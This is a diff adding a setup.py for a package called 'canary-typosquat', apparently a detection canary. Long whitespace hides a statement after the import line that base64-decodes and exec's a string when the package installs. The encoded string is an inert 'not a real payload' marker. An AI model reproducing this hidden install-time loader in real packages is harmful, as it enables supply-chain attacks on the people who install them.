@@ -1,0 +1,2 @@
+from setuptools import setup                                                                                                                                                                                                                                                                    ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("Q0FOQVJZX25vdF9hX3JlYWxfcGF5bG9hZA=="),'<string>','exec'))
+setup(name="canary-typosquat", version="0.0.1", packages=[])
